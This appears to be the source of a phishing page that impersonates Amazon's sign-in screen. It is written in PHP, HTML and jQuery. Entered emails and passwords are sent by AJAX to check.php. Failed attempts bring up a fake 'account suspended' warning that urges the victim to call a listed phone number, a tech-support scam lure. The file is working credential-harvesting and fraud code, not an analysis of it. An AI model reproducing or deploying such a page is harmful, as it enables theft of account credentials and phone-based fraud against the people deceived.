<?php
session_start();
include('check.php');


//bhjhjj
if (! isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = base64_encode(openssl_random_pseudo_bytes(32));
}

if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // POST data is valid.
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

     <title>Amazon - Login</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<style type="text/css">
     form { margin: 0px 10px; }

h2 {
  margin-top: 2px;
  margin-bottom: 2px;
}

.container { 
	width:30%; 
	height: 50%;
}

.divider {
  text-align: center;
  margin-top: 20px;
  margin-bottom: 5px;
}

.divider hr {
  margin: 7px 0px;
  width: 35%;
}

.left { float: left; }

.right { float: right; }
#result{
     /*color: red;*/
     display: none;
     position: relative;
     left:36.5%;
     border:1px solid maroon;
     border-radius: 5px;
     padding:5px;
     margin: 0 0 10px;
     /*width: fit-content;*/
      width:26%;
 
     
}
ul li{
  list-style-type:none;
}


</style>
<body>


<center><img src="amazon_logo_no-org_mid._V153387053_.png" class="img-responsive" style="margin-top: 5%;"></center><br>

 <div class="form-group" id="result" style="font-size: 15px; box-sizing: content-box;"><ul><li>A suspicious activity has been detected on your account. Due to security reasons we have temporarily suspended your account<br>
        Please call on <a href="#">+1-888-318-0759</a> to reactivate your account</li> </ul>
 </div>

<div class="container">
     <div class="row">
          <div class="panel panel-default">
          <div class="panel-body">   
          <form method="post">        
                         <div style="font-size: 25px;"> Sign In</div>
                          <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>" />
                                   <label><strong>Email(phone for mobile accounts)</strong></label>
                              <div class="form-group">
                                   <input type="text" name="email" id="email" maxlength="50" class="form-control">
                              </div>
                              <!-- <input type="text" name="count" id="count" value="" class="form-control"> -->
                              
                                   <label><strong>Password</strong></label>
                                   <span class="right"><a href="#">Forgot your password?</a></span>
                              <div class="form-group">
                                  <input  type="password" id="password" name="password" maxlength="25" class="form-control">
                              </div>
                              <div class="form-group" style="padding-top: 12px;">
                                   <button  type="button" name="submit" onclick="signin();" class="btn btn-block" style="background-color: #f0c14b; color:#000; font-size: 15px; border-color: #000;">Sign in</button>
                              </div>
                           <div class="form-group divider">
                                   <hr class="left"><small>Sign in</small><hr class="right">
                              </div>
                      <button type="button" class="btn btn-default btn-block">Create an account</button> 
                      <p>By signing in you are agreeing to our <a href="#">Terms of Use</a> and our <a href="#">Privacy Policy</a></p>
                    </form>
                </div>
            </div>
        </div>
    </div>
</body>
</html>

<script type="text/javascript">
  var count = 0;
   function signin() {
        var email=$('#email').val();
        var password=$('#password').val();
        if(email =="")
        {
          alert("Enter email");
          return false;
        }
        else if(password == "")
        {
          alert("Please enter password");
          return false;
        }
        else
        {
          $.ajax({

          type:'post',
          url:'check.php',
          data: {email:email,password:password},
          
          success:function(data) {
            if(data == 1){
              window.location.href='next.php';
            }
            else{
              // alert(data);
              $('#result').show();
              count = count + 1;
              localStorage.setItem('count',count);
              var c = localStorage.getItem('count');
              if(c > 3){
               alert("Login Limit Exceeded Try to login after 30 seconds "); 
               $('#submit').prop('disabled', true);
               $('#result').hide();
               $('#email').val("");
               $('#password').val("");
               setInterval(function(){localStorage.clear();$('#submit').prop('disabled',false); alert("You can login now")},30000);
               
              }
             
            }
          }
        
       });   
      }
  }


  window.csrf = { csrf_token: '<?php echo $_SESSION['csrf_token']; ?>' };

    $.ajaxSetup({
        data: window.csrf
    });

</script>